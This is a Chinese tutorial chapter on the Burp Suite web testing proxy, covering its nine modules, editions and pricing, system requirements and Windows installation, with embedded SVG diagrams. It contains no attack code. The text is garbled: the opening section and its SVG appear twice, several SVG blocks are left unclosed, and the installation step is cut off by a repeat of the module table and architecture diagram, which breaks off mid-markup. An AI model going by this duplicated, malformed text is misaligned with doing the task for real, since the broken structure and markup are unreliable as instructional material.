# 第一章：Burp Suite - Web渗透测试利器

## 1.1 Burp Suite 简介

### 什么是 Burp Suite？

想象一下，你正在测试一个网站的安全性，想要看看用户登录功能是否存在漏洞。传统的做法是：打开浏览器，输入用户名密码，点击登录，然后观察结果。但这种方法有很大的局限性——你看不到浏览器和服务器之间到底发生了什么，也无法修改发送的数据来测试各种攻击场景。

**Burp Suite** 就像是给你的浏览器装上了一双"透视眼"和一双"魔术手"。它能拦截浏览器和服务器之间的所有通信，让你看到每一句对话的细节，并且可以随意修改这些对话的内容。

简单来说，Burp Suite 是一个**Web安全测试工具集**，它可以帮助你：
- 拦截和查看HTTP/HTTPS请求和响应
- 修改请求内容进行各种测试
- 自动扫描网站漏洞
- 暴力破解密码
- 进行各种高级攻击测试

### Burp Suite 能做什么？

**📦 Burp Suite 九大模块架构图：**

<svg viewBox="0 0 800 420" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:800px;">

  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#0f172a"/>
      <stop offset="100%" stop-color="#1e1b4b"/>
    </linearGradient>
    <linearGradient id="core" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#7c3aed"/>
      <stop offset="100%" stop-color="#2563eb"/>
    </linearGradient>
    <linearGradient id="mod" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#1e293b"/>
      <stop offset="100%" stop-color="#0f172a"/>
    </linearGradient>
  </defs>
  <rect width="800" height="420" rx="16" fill="url(#bg)"/>
  <!-- 核心模块（中心） -->
  <g>
    <rect x="320" y="170" width="160" height="80" rx="12" fill="url(#core)" stroke="#a78bfa" stroke-width="2"/>
    <text x="400" y="205" text-anchor="middle" fill="#fff" font-size="18" font-weight="bold" font-family="Arial">Proxy</text>
    <text x="400" y="228" text-anchor="middle" fill="#e9d5ff" font-size="13" font-family="Arial">代理 · 流量中枢</text>
  </g>
  <!-- 上排3个模块 -->
  <g>
    <rect x="60" y="40" width="150" height="70" rx="10" fill="url(#mod)" stroke="#38bdf8" stroke-width="1.5"/>
    <text x="135" y="72" text-anchor="middle" fill="#7dd3fc" font-size="15" font-weight="bold" font-family="Arial">Target</text>
    <text x="135" y="92" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">目标管理</text>
    <line x1="190" y1="110" x2="340" y2="170" stroke="#475569" stroke-width="1.5" stroke-dasharray="4 3"/>

    <rect x="325" y="40" width="150" height="70" rx="10" fill="url(#mod)" stroke="#f472b6" stroke-width="1.5"/>
    <text x="400" y="72" text-anchor="middle" fill="#f9a8d4" font-size="15" font-weight="bold" font-family="Arial">Scanner</text>
    <text x="400" y="92" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">自动漏洞扫描</text>
    <line x1="400" y1="110" x2="400" y2="170" stroke="#475569" stroke-width="1.5" stroke-dasharray="4 3"/>

    <rect x="590" y="40" width="150" height="70" rx="10" fill="url(#mod)" stroke="#34d399" stroke-width="1.5"/>
    <text x="665" y="72" text-anchor="middle" fill="#6ee7b7" font-size="15" font-weight="bold" font-family="Arial">Spider</text>
    <text x="665" y="92" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">爬虫爬取</text>
    <line x1="610" y1="110" x2="460" y2="170" stroke="#475569" stroke-width="1.5" stroke-dasharray="4 3"/>
  </g>
  <!-- 中排2个模块 -->
  <g>
    <rect x="60" y="230" width="150" height="70" rx="10" fill="url(#mod)" stroke="#fbbf24" stroke-width="1.5"/>
    <text x="135" y="262" text-anchor="middle" fill="#fcd34d" font-size="15" font-weight="bold" font-family="Arial">Intruder</text>
    <text x="135" y="282" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">暴力破解/Fuzz</text>
    <line x1="210" y1="265" x2="320" y2="210" stroke="#475569" stroke-width="1.5" stroke-dasharray="4 3"/>

    <rect x="590" y="230" width="150" height="70" rx="10" fill="url(#mod)" stroke="#fb7185" stroke-width="1.5"/>
    <text x="665" y="262" text-anchor="middle" fill="#fda4af" font-size="15" font-weight="bold" font-family="Arial">Repeater</text>
    <text x="665" y="282" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">重放请求</text>
    <line x1="590" y1="265" x2="480" y2="210" stroke="#475569" stroke-width="1.5" stroke-dasharray="4 3"/>
  </g>
  <!-- 下排3个模块 -->
  <g>
    <rect x="60" y="340" width="150" height="60" rx="10" fill="url(#mod)" stroke="#22d3ee" stroke-width="1.5"/>
    <text x="135" y="375" text-anchor="middle" fill="#67e8f9" font-size="14" font-weight="bold" font-family="Arial">Sequencer</text>
    <text x="135" y="392" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">随机数分析</text>
    <line x1="180" y1="340" x2="330" y2="250" stroke="#475569" stroke-width="1.5" stroke-dasharray="4 3"/>

    <rect x="325" y="340" width="150" height="60" rx="10" fill="url(#mod)" stroke="#c084fc" stroke-width="1.5"/>
    <text x="400" y="375" text-anchor="middle" fill="#d8b4fe" font-size="14" font-weight="bold" font-family="Arial">Decoder</text>
    <text x="400" y="392" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">编码解码</text>
    <line x1="400" y1="340" x2="400" y2="250" stroke="#475569" stroke-width="1.5" stroke-dasharray="4 3"/>

    <rect x="590" y="340" width="150" height="60" rx="10" fill="url(#mod)" stroke="#facc15" stroke-width="1.5"/>
    <text x="665" y="375" text-anchor="middle" fill="#fde047" font-size="14" font-weight="bold" font-family="Arial">Comparer</text>
    <text x="665" y="392" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">数据对比</text>
    <line x1="620" y1="340" x2="470" y2="250" stroke="#475569" stroke-width="1.5" stroke-dasharray="4 3"/>
  </g>
  <!-- 标题 -->
  <text x="400" y="25" text-anchor="middle" fill="#e2e8f0" font-size="16" font-family="Arial" font-weight="bold">⚡ Burp Suite 模块关系图（Proxy 为核心，所有模块互联）</text>
# 第一章：Burp Suite - Web渗透测试利器

## 1.1 Burp Suite 简介

### 什么是 Burp Suite？

想象一下，你正在测试一个网站的安全性，想要看看用户登录功能是否存在漏洞。传统的做法是：打开浏览器，输入用户名密码，点击登录，然后观察结果。但这种方法有很大的局限性——你看不到浏览器和服务器之间到底发生了什么，也无法修改发送的数据来测试各种攻击场景。

**Burp Suite** 就像是给你的浏览器装上了一双"透视眼"和一双"魔术手"。它能拦截浏览器和服务器之间的所有通信，让你看到每一句对话的细节，并且可以随意修改这些对话的内容。

简单来说，Burp Suite 是一个**Web安全测试工具集**，它可以帮助你：
- 拦截和查看HTTP/HTTPS请求和响应
- 修改请求内容进行各种测试
- 自动扫描网站漏洞
- 暴力破解密码
- 进行各种高级攻击测试

### Burp Suite 能做什么？

**📦 Burp Suite 九大模块架构图：**

<svg viewBox="0 0 800 420" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:800px;">

  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#0f172a"/>
      <stop offset="100%" stop-color="#1e1b4b"/>
    </linearGradient>
    <linearGradient id="core" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#7c3aed"/>
      <stop offset="100%" stop-color="#2563eb"/>
    </linearGradient>
    <linearGradient id="mod" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#1e293b"/>
      <stop offset="100%" stop-color="#0f172a"/>
    </linearGradient>
  </defs>
  <rect width="800" height="420" rx="16" fill="url(#bg)"/>
  <!-- 核心模块（中心） -->
  <g>
    <rect x="320" y="170" width="160" height="80" rx="12" fill="url(#core)" stroke="#a78bfa" stroke-width="2"/>
    <text x="400" y="205" text-anchor="middle" fill="#fff" font-size="18" font-weight="bold" font-family="Arial">Proxy</text>
    <text x="400" y="228" text-anchor="middle" fill="#e9d5ff" font-size="13" font-family="Arial">代理 · 流量中枢</text>
  </g>
  <!-- 上排3个模块 -->
  <g>
    <rect x="60" y="40" width="150" height="70" rx="10" fill="url(#mod)" stroke="#38bdf8" stroke-width="1.5"/>
    <text x="135" y="72" text-anchor="middle" fill="#7dd3fc" font-size="15" font-weight="bold" font-family="Arial">Target</text>
    <text x="135" y="92" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">目标管理</text>
    <line x1="190" y1="110" x2="340" y2="170" stroke="#475569" stroke-width="1.5" stroke-dasharray="4 3"/>

    <rect x="325" y="40" width="150" height="70" rx="10" fill="url(#mod)" stroke="#f472b6" stroke-width="1.5"/>
    <text x="400" y="72" text-anchor="middle" fill="#f9a8d4" font-size="15" font-weight="bold" font-family="Arial">Scanner</text>
    <text x="400" y="92" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">自动漏洞扫描</text>
    <line x1="400" y1="110" x2="400" y2="170" stroke="#475569" stroke-width="1.5" stroke-dasharray="4 3"/>

    <rect x="590" y="40" width="150" height="70" rx="10" fill="url(#mod)" stroke="#34d399" stroke-width="1.5"/>
    <text x="665" y="72" text-anchor="middle" fill="#6ee7b7" font-size="15" font-weight="bold" font-family="Arial">Spider</text>
    <text x="665" y="92" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">爬虫爬取</text>
    <line x1="610" y1="110" x2="460" y2="170" stroke="#475569" stroke-width="1.5" stroke-dasharray="4 3"/>
  </g>
  <!-- 中排2个模块 -->
  <g>
    <rect x="60" y="230" width="150" height="70" rx="10" fill="url(#mod)" stroke="#fbbf24" stroke-width="1.5"/>
    <text x="135" y="262" text-anchor="middle" fill="#fcd34d" font-size="15" font-weight="bold" font-family="Arial">Intruder</text>
    <text x="135" y="282" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">暴力破解/Fuzz</text>
    <line x1="210" y1="265" x2="320" y2="210" stroke="#475569" stroke-width="1.5" stroke-dasharray="4 3"/>

    <rect x="590" y="230" width="150" height="70" rx="10" fill="url(#mod)" stroke="#fb7185" stroke-width="1.5"/>
    <text x="665" y="262" text-anchor="middle" fill="#fda4af" font-size="15" font-weight="bold" font-family="Arial">Repeater</text>
    <text x="665" y="282" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">重放请求</text>
    <line x1="590" y1="265" x2="480" y2="210" stroke="#475569" stroke-width="1.5" stroke-dasharray="4 3"/>
  </g>
  <!-- 下排3个模块 -->
  <g>
    <rect x="60" y="340" width="150" height="60" rx="10" fill="url(#mod)" stroke="#22d3ee" stroke-width="1.5"/>
    <text x="135" y="375" text-anchor="middle" fill="#67e8f9" font-size="14" font-weight="bold" font-family="Arial">Sequencer</text>
    <text x="135" y="392" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">随机数分析</text>
    <line x1="180" y1="340" x2="330" y2="250" stroke="#475569" stroke-width="1.5" stroke-dasharray="4 3"/>

    <rect x="325" y="340" width="150" height="60" rx="10" fill="url(#mod)" stroke="#c084fc" stroke-width="1.5"/>
    <text x="400" y="375" text-anchor="middle" fill="#d8b4fe" font-size="14" font-weight="bold" font-family="Arial">Decoder</text>
    <text x="400" y="392" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">编码解码</text>
    <line x1="400" y1="340" x2="400" y2="250" stroke="#475569" stroke-width="1.5" stroke-dasharray="4 3"/>

    <rect x="590" y="340" width="150" height="60" rx="10" fill="url(#mod)" stroke="#facc15" stroke-width="1.5"/>
    <text x="665" y="375" text-anchor="middle" fill="#fde047" font-size="14" font-weight="bold" font-family="Arial">Comparer</text>
    <text x="665" y="392" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">数据对比</text>
    <line x1="620" y1="340" x2="470" y2="250" stroke="#475569" stroke-width="1.5" stroke-dasharray="4 3"/>
  </g>
  <!-- 标题 -->
  <text x="400" y="25" text-anchor="middle" fill="#e2e8f0" font-size="16" font-family="Arial" font-weight="bold">⚡ Burp Suite 模块关系图（Proxy 为核心，所有模块互联）</text>
</svg>

| 功能 | 说明 | 通俗理解 |
|------|------|----------|
| Proxy（代理） | 拦截HTTP/HTTPS流量 | 像邮局一样，拦截所有来往信件 |
| Target（目标） | 管理目标网站信息 | 建立目标档案库 |
| Spider（爬虫） | 自动爬取网站页面 | 自动探索网站的每个角落 |
| Scanner（扫描） | 自动扫描漏洞 | 自动体检，找出潜在问题 |
| Intruder（入侵者） | 暴力破解和Fuzz | 自动尝试各种密码和参数组合 |
| Repeater（重发器） | 手工修改请求测试 | 手动修改信件内容重新发送 |
| Sequencer（序列分析） | 分析随机性 | 检验密码是否足够随机 |
| Decoder（解码器） | 编码解码工具 | 翻译各种加密语言 |
| Comparer（比较器） | 数据对比工具 | 比较两封信有什么不同 |


<svg viewBox="0 0 1200 720" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:1100px;margin:22px auto;display:block;border:1px solid #2a2a3a;border-radius:16px;background:#0f1124;">
  <defs>
    <linearGradient id="gTitle1c01" x1="0" x2="1">
      <stop offset="0%" stop-color="#f59e0b"/><stop offset="100%" stop-color="#ef4444"/>
    </linearGradient>
    <marker id="arrow1c01" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#fbbf24"/></marker>
    <marker id="arrow2c01" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#34d399"/></marker>
  </defs>
  <text x="40" y="46" fill="url(#gTitle1c01)" font-size="26" font-weight="bold" font-family="Microsoft YaHei,Arial">🖼️ 图 1-1 · Burp Suite 整体工作架构全景图（从浏览器到靶场的 7 步数据流）</text>
  <line x1="40" y1="62" x2="1160" y2="62" stroke="#374151"/>
  <rect x="40" y="100" width="260" height="130" rx="16" fill="#1e293b" stroke="#64748b" stroke-width="2"/>
  <circle cx="68" cy="125" r="7" fill="#ef4444"/><circle cx="90" cy="125" r="7" fill="#f59e0b"/><circle cx="112" cy="125" r="7" fill="#10b981"/>
  <text x="140" y="129" fill="#cbd5e1" font-size="13" font-family="Arial">Firefox / Chrome + FoxyProxy</text>
  <rect x="60" y="150" width="220" height="28" rx="6" fill="#0f172a" stroke="#334155"/>
  <text x="70" y="170" fill="#22d3ee" font-size="13" font-family="Consolas">https://target.com/login.php</text>
  <text x="60" y="210" fill="#fbbf24" font-size="14" font-weight="bold" font-family="Microsoft YaHei">👆 所有请求/响应先经过代理！</text>
  <rect x="350" y="90" width="500" height="560" rx="22" fill="#1f2937" stroke="#f59e0b" stroke-width="3"/>
  <text x="375" y="126" fill="#fbbf24" font-size="22" font-weight="bold" font-family="Microsoft YaHei">🛡️ Burp Suite（中间人的大脑）</text>
  <line x1="370" y1="142" x2="830" y2="142" stroke="#4b5563"/>
  <rect x="370" y="160" width="220" height="110" rx="12" fill="#7c2d12" stroke="#f97316" stroke-width="2"/>
  <text x="388" y="186" fill="#fed7aa" font-size="16" font-weight="bold" font-family="Microsoft YaHei">① Proxy · 代理</text>
  <rect x="382" y="198" width="196" height="22" rx="4" fill="#000" stroke="#431407"/>
  <text x="390" y="214" fill="#f97316" font-size="12" font-family="Consolas">监听器 127.0.0.1:8080</text>
  <text x="388" y="242" fill="#e2e8f0" font-size="13" font-family="Microsoft YaHei">Intercept On / Off · Forward / Drop</text>
  <text x="388" y="260" fill="#e2e8f0" font-size="13" font-family="Microsoft YaHei">HTTP history · WebSocket history</text>
  <path d="M300 165 C 320 165, 320 165, 350 165" stroke="#fbbf24" stroke-width="3" marker-end="url(#arrow1c01)" fill="none"/>
  <path d="M350 200 C 320 200, 320 200, 300 200" stroke="#34d399" stroke-width="3" marker-end="url(#arrow2c01)" fill="none"/>
  <text x="305" y="155" fill="#fbbf24" font-size="12" font-family="Microsoft YaHei">→ 请求</text>
  <text x="305" y="216" fill="#34d399" font-size="12" font-family="Microsoft YaHei">← 响应</text>
  <rect x="610" y="160" width="220" height="110" rx="12" fill="#111827" stroke="#a855f7" stroke-width="2"/>
  <text x="628" y="186" fill="#e9d5ff" font-size="16" font-weight="bold" font-family="Microsoft YaHei">② HTTP 历史</text>
  <text x="626" y="212" fill="#cbd5e1" font-size="12" font-family="Consolas"># Method URL Status</text>
  <text x="626" y="230" fill="#22d3ee" font-size="12" font-family="Consolas">1 POST /login 302</text>
  <text x="626" y="248" fill="#f87171" font-size="12" font-family="Consolas">2 GET /admin 403</text>
  <text x="626" y="266" fill="#4ade80" font-size="12" font-family="Consolas">3 GET /index 200</text>
  <line x1="590" y1="215" x2="610" y2="215" stroke="#a855f7" stroke-width="2" marker-end="url(#arrow1c01)"/>
  <rect x="370" y="295" width="220" height="100" rx="12" fill="#111827" stroke="#22d3ee" stroke-width="2"/>
  <text x="388" y="322" fill="#a5f3fc" font-size="16" font-weight="bold" font-family="Microsoft YaHei">③ Target · 站点地图</text>
  <text x="388" y="348" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 Add to scope · Scope 过滤</text>
  <text x="388" y="370" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 右键 Send to 其他模块</text>
  <rect x="370" y="410" width="220" height="100" rx="12" fill="#111827" stroke="#f472b6" stroke-width="2"/>
  <text x="388" y="437" fill="#fce7f3" font-size="16" font-weight="bold" font-family="Microsoft YaHei">⑤ Repeater · 请求重放</text>
  <text x="388" y="463" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 手动改参数 · Send 发送</text>
  <text x="388" y="485" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 左请求 / 右响应对照</text>
  <rect x="370" y="525" width="220" height="100" rx="12" fill="#111827" stroke="#ef4444" stroke-width="2"/>
  <text x="388" y="552" fill="#fecaca" font-size="16" font-weight="bold" font-family="Microsoft YaHei">⑦ Intruder · 爆破/Fuzz</text>
  <text x="388" y="578" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 4种攻击：Sniper / Pitchfork</text>
  <text x="388" y="600" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 加字典 · 找密码/未授权</text>
  <rect x="610" y="295" width="220" height="100" rx="12" fill="#111827" stroke="#10b981" stroke-width="2"/>
  <text x="628" y="322" fill="#bbf7d0" font-size="16" font-weight="bold" font-family="Microsoft YaHei">④ Spider / Scanner</text>
  <text x="628" y="348" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 Spider 自动爬 URL</text>
  <text x="628" y="370" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 Scanner 专业版自动扫漏洞</text>
  <rect x="610" y="410" width="220" height="100" rx="12" fill="#111827" stroke="#34d399" stroke-width="2"/>
  <text x="628" y="437" fill="#d1fae5" font-size="16" font-weight="bold" font-family="Microsoft YaHei">⑥ Decoder · 编码解码</text>
  <text x="628" y="463" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 Base64 / URL / Hex / ASCII</text>
  <text x="628" y="485" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 Smart decode 智能识别</text>
  <rect x="610" y="525" width="220" height="100" rx="12" fill="#111827" stroke="#38bdf8" stroke-width="2"/>
  <text x="628" y="552" fill="#e0f2fe" font-size="16" font-weight="bold" font-family="Microsoft YaHei">⑧ Comparer · 数据对比</text>
  <text x="628" y="578" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 Words / Bytes 两按钮对比</text>
  <text x="628" y="600" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 越权 / SQL盲注差异</text>
  <line x1="480" y1="395" x2="480" y2="410" stroke="#fbbf24" stroke-width="2" marker-end="url(#arrow1c01)"/>
  <line x1="480" y1="510" x2="480" y2="525" stroke="#fbbf24" stroke-width="2" marker-end="url(#arrow1c01)"/>
  <line x1="720" y1="395" x2="720" y2="410" stroke="#fbbf24" stroke-width="2" marker-end="url(#arrow1c01)"/>
  <line x1="720" y1="510" x2="720" y2="525" stroke="#fbbf24" stroke-width="2" marker-end="url(#arrow1c01)"/>
  <line x1="480" y1="270" x2="480" y2="295" stroke="#fbbf24" stroke-width="2" marker-end="url(#arrow1c01)"/>
  <line x1="720" y1="270" x2="720" y2="295" stroke="#fbbf24" stroke-width="2" marker-end="url(#arrow1c01)"/>
  <rect x="900" y="220" width="260" height="220" rx="18" fill="#1e293b" stroke="#10b981" stroke-width="2"/>
  <text x="920" y="254" fill="#bbf7d0" font-size="20" font-weight="bold" font-family="Microsoft YaHei">🎯 Web 靶场 / 真实目标</text>
  <line x1="920" y1="270" x2="1140" y2="270" stroke="#475569"/>
  <rect x="920" y="288" width="220" height="120" rx="10" fill="#0f172a" stroke="#334155"/>
  <text x="932" y="314" fill="#fbbf24" font-size="13" font-weight="bold" font-family="Microsoft YaHei">🔑 HTTPS 真实证书链</text>
  <text x="932" y="338" fill="#cbd5e1" font-size="13" font-family="Microsoft YaHei">Nginx / Apache / PHP</text>
  <text x="932" y="360" fill="#cbd5e1" font-size="13" font-family="Microsoft YaHei">MySQL / Redis 数据库</text>
  <text x="932" y="382" fill="#cbd5e1" font-size="13" font-family="Microsoft YaHei">WAF / CDN / 云防护</text>
  <text x="920" y="424" fill="#f87171" font-size="13" font-family="Microsoft YaHei">⚠️ 这里才是真正的攻击对象</text>
  <path d="M850 280 C 875 280, 875 280, 900 280" stroke="#fbbf24" stroke-width="3" marker-end="url(#arrow1c01)" fill="none"/>
  <path d="M900 340 C 875 340, 875 340, 850 340" stroke="#34d399" stroke-width="3" marker-end="url(#arrow2c01)" fill="none"/>
  <text x="856" y="270" fill="#fbbf24" font-size="12" font-family="Microsoft YaHei">Burp转发请求→</text>
  <text x="856" y="356" fill="#34d399" font-size="12" font-family="Microsoft YaHei">←靶场响应回Burp</text>
  <rect x="40" y="670" width="1120" height="34" rx="8" fill="#111827" stroke="#475569"/>
  <text x="58" y="693" fill="#fde68a" font-size="13" font-weight="bold" font-family="Microsoft YaHei">💡 记住顺序：浏览器→代理(Proxy)→HTTP历史存底→手动送Repeater改参→批量送Intruder爆破→编码送Decoder→差异送Comparer</text>
</svg>


### Burp Suite 的版本

Burp Suite 有三个版本：

| 版本 | 价格 | 功能 | 适用人群 |
|------|------|------|----------|
| **社区版（Community Edition）** | 免费 | Proxy、Target、Spider、Repeater、Decoder、Comparer | 初学者、学习使用 |
| **专业版（Professional）** | $449/年 | 包含社区版功能 + Scanner、Intruder、Sequencer | 专业渗透测试人员 |
| **企业版（Enterprise）** | $3999/年起 | 包含专业版功能 + 自动化扫描、CI/CD集成 | 企业安全团队 |

**初学者建议**：先用免费的社区版学习基本功能，熟练后再考虑购买专业版。社区版虽然功能有限，但对于学习Web安全基础已经足够。

---

## 1.2 系统环境要求

### 硬件要求

Burp Suite 是一个Java程序，对硬件要求不高：

- **CPU**：任何现代CPU都可以，推荐双核以上
- **内存**：至少4GB，推荐8GB以上（扫描大型网站时需要更多内存）
- **硬盘**：至少500MB可用空间
- **显示器**：推荐分辨率1920×1080以上

### 软件要求

| 操作系统 | 支持情况 |
|----------|----------|
| Windows 10/11 | ✅ 完全支持 |
| Windows 7/8 | ✅ 支持，但建议升级 |
| macOS 10.13+ | ✅ 完全支持 |
| Linux | ✅ 完全支持 |

### Java环境要求

Burp Suite 需要Java环境才能运行：

- **Java版本**：Java 8 到 Java 17（推荐Java 11或17）
- **JDK/JRE**：都可以，只需要JRE即可运行

> 💡 **小贴士**：Burp Suite 专业版下载时可以选择"包含JRE"的版本，这样就不需要单独安装Java了。社区版需要自行安装Java环境。

---

## 1.3 Windows 系统安装教程

### 步骤1：下载 Burp Suite

**下载社区版（免费）：**
1. 访问官网：https://portswigger.net/burp/communitydesktop
2. 点击"Download"按钮
3. 选择Windows版本下载

**下载专业版（付费）：**
1. 访问官网：https://portswigger.net/burp/pro
2. 购买后登录账户
3. 在下载页面选择Windows版本
4. 可以选择"Standalone JAR file"（需要自行安装Java）或"Windows installer"（包含Java环境）

### 步骤2：安装 Java 环境（社区版需要）

如果你下载的是社区版或者选择不包含Java的专业版，需要先安装Java：

1. 访问Java下载页面：https://www.java.com/download/
2. 下载Windows版本的Java安装包
3. 双击安装包，按照提示安装
4. 安装完成后，打开命令提示符，输入：
   ```
   java -version
   ```
   如果显示版本信息，说明Java安装成功

### 步骤3：安装 Burp Suite

**方式一：使用安装程序（推荐新手）**

如果你下载的是`.exe`安装文件：
1. 双击安装文件
2. 选择安装目录（默认即可）
3. 点击"Next"直到完成安装
4. 安装完成后，桌面会出现Burp Suite图标

**方式二：使用JAR文件**

如果你下载的是`.jar`文件：
1. 将`.jar`文件放在一个固定的目录（如`D:\BurpSuite`）
2. 双击`.jar`文件即可运行（如果Java安装正确）
3. 如果双击无法运行，可以创建一个启动脚本：

   创建`burpsuite.bat`文件，内容如下：
   ```batch
   @echo off
   java -jar burpsuite_community.jar
   pause
   ```

### 步骤4：首次启动配置

第一次启动Burp Suite时，会看到一个临时项目选择界面：

**🖥️ 首次启动界面示意图：**

<svg viewBox="0 0 800 400" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:800px;">

  <defs>
    <linearGradient id="winBg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#1e293b"/>
      <stop offset="100%" stop-color="#0f172a"/>
    </linearGradient>
  </defs>
  <!-- 窗口 -->
  <rect width="800" height="400" rx="12" fill="url(#winBg)" stroke="#475569" stroke-width="1"/>
  <!-- 标题栏 -->
  <rect x="0" y="0" width="800" height="36" rx="12" fill="#334155"/>
  <rect x="0" y="12" width="800" height="24" fill="#334155"/>
  <circle cx="22" cy="18" r="7" fill="#ef4444"/>
  <circle cx="44" cy="18" r="7" fill="#f59e0b"/>
  <circle cx="66" cy="18" r="7" fill="#10b981"/>
  <text x="400" y="24" text-anchor="middle" fill="#e2e8f0" font-size="13" font-family="Arial">Burp Suite Community Edition</text>
  <!-- 新建项目面板 -->
  <rect x="50" y="70" width="700" height="300" rx="10" fill="#0f172a" stroke="#7c3aed" stroke-width="2"/>
  <rect x="50" y="70" width="700" height="44" rx="10" fill="#7c3aed"/>
  <rect x="50" y="92" width="700" height="22" fill="#7c3aed"/>
  <text x="85" y="99" fill="#fff" font-size="15" font-weight="bold" font-family="Arial">📋 欢迎使用 Burp Suite - 请选择项目类型</text>
  <!-- 选项1: 临时项目 -->
  <g>
    <rect x="80" y="136" width="640" height="56" rx="8" fill="#1e293b" stroke="#475569" stroke-width="1.5"/>
    <circle cx="105" cy="164" r="10" fill="none" stroke="#94a3b8" stroke-width="2"/>
    <circle cx="105" cy="164" r="4" fill="#7c3aed"/>
    <text x="130" y="158" fill="#e2e8f0" font-size="14" font-weight="bold" font-family="Arial">Temporary project · 临时项目</text>
    <text x="130" y="178" fill="#94a3b8" font-size="12" font-family="Arial">快速启动，关闭后数据不保存，适合临时测试</text>
  </g>
  <!-- 选项2: 新建项目（选中） -->
  <g>
    <rect x="80" y="206" width="640" height="56" rx="8" fill="#4c1d95" stroke="#a78bfa" stroke-width="2.5"/>
    <circle cx="105" cy="234" r="10" fill="#7c3aed" stroke="#c4b5fd" stroke-width="2"/>
    <path d="M 100 234 l 3 3 l 6 -7" stroke="#fff" stroke-width="2" fill="none"/>
    <text x="130" y="228" fill="#fff" font-size="14" font-weight="bold" font-family="Arial">✓ New project on disk · 新建磁盘项目（推荐）</text>
    <text x="130" y="248" fill="#ddd6fe" font-size="12" font-family="Arial">数据保存到本地硬盘，可随时打开继续测试</text>
  </g>
  <!-- 选项3: 打开已有 -->
  <g>
    <rect x="80" y="276" width="640" height="56" rx="8" fill="#1e293b" stroke="#475569" stroke-width="1.5"/>
    <circle cx="105" cy="304" r="10" fill="none" stroke="#94a3b8" stroke-width="2"/>
    <text x="130" y="298" fill="#e2e8f0" font-size="14" font-weight="bold" font-family="Arial">Open existing project · 打开已有项目</text>
    <text x="130" y="318" fill="#94a3b8" font-size="12" font-family="Arial">浏览并打开之前保存过的 .burp 项目文件</text>
  </g>
  <!-- 按钮 -->
  <rect x="600" y="348" width="130" height="36" rx="6" fill="#7c3aed"/>
  <text x="665" y="371" text-anchor="middle" fill="#fff" font-size="14" font-weight="bold" font-family="Arial">Start Burp →</text>


| 功能 | 说明 | 通俗理解 |
|------|------|----------|
| Proxy（代理） | 拦截HTTP/HTTPS流量 | 像邮局一样，拦截所有来往信件 |
| Target（目标） | 管理目标网站信息 | 建立目标档案库 |
| Spider（爬虫） | 自动爬取网站页面 | 自动探索网站的每个角落 |
| Scanner（扫描） | 自动扫描漏洞 | 自动体检，找出潜在问题 |
| Intruder（入侵者） | 暴力破解和Fuzz | 自动尝试各种密码和参数组合 |
| Repeater（重发器） | 手工修改请求测试 | 手动修改信件内容重新发送 |
| Sequencer（序列分析） | 分析随机性 | 检验密码是否足够随机 |
| Decoder（解码器） | 编码解码工具 | 翻译各种加密语言 |
| Comparer（比较器） | 数据对比工具 | 比较两封信有什么不同 |


<svg viewBox="0 0 1200 720" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:1100px;margin:22px auto;display:block;border:1px solid #2a2a3a;border-radius:16px;background:#0f1124;">
  <defs>
    <linearGradient id="gTitle1c01" x1="0" x2="1">
      <stop offset="0%" stop-color="#f59e0b"/><stop offset="100%" stop-color="#ef4444"/>
    </linearGradient>
    <marker id="arrow1c01" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#fbbf24"/></marker>
    <marker id="arrow2c01" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#34d399"/></marker>
  </defs>
  <text x="40" y="46" fill="url(#gTitle1c01)" font-size="26" font-weight="bold" font-family="Microsoft YaHei,Arial">🖼️ 图 1-1 · Burp Suite 整体工作架构全景图（从浏览器到靶场的 7 步数据流）</text>
